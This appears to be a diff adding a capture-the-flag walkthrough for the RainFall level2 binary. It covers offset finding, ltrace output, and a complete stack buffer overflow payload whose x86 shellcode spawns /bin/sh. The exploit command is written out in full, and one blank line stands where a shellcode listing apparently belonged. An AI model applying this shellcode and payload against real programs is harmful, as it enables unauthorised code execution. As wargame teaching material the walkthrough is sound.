@@ -1,0 +1,61 @@
+Walkthrough: Buffer Overflow with Shellcode Injection (level2)
+
+Objective:
+Exploit a buffer overflow vulnerability to inject and execute custom shellcode.
+
+---
+
+Step 1: Determine the Offset to Return Address
+
+Tool used:
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+
+Generate a unique pattern and input it to the program. After the crash, examine the EIP/RIP register to find how many bytes are needed to reach the return address.
+
+In this case, the offset is determined to be 80 bytes.
+
+---
+
+Step 2: Identify Shellcode Injection Location
+
+Run the binary using `ltrace` to see where input is stored:
+
+    level2@RainFall:~$ ltrace ./level2
+    __libc_start_main(0x804853f, 1, 0xbffff804, 0x8048550, 0x80485c0 <unfinished ...>
+    fflush(0xb7fd1a20)                          = 0
+    gets(0xbffff70c, 0, 0, 0xb7e5ec73, 0x80482b5) = 0xbffff70c
+    puts("")                                    = 1
+    strdup("")                                  = 0x0804a008
+    +++ exited (status 8) +++
+
+We see that `gets()` writes input to address `0xbffff70c`, and later `strdup` returns heap address `0x0804a008`.
+
+Since we control the buffer passed to `gets()`, we can inject shellcode into it and then overwrite the return address to jump to the shellcode.
+
+In this example, we choose to jump to `0x0804a008`.
+
+---
+
+Step 3: Create the Exploit Payload
+
+Use standard Linux x86 shellcode to spawn `/bin/sh`. The shellcode used is:
+
+
+
+This shellcode is 28 bytes long.
+
+The full payload structure is:
+    [shellcode] + [padding] + [address of shellcode in little endian]
+
+To reach 80 bytes total before overwriting the return address:
+    - Shellcode: 28 bytes
+    - Padding: 52 bytes ('a' * 52)
+    - Return address: 0x0804a008 (in little endian: \x08\xa0\x04\x08)
+
+Command:
+    (python -c "print ('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'a' * 52 + '\x08\xa0\x04\x08')" && cat) | ./level2
+
+---
+
+Result:
+If successful, the program executes the shellcode and spawns a shell.
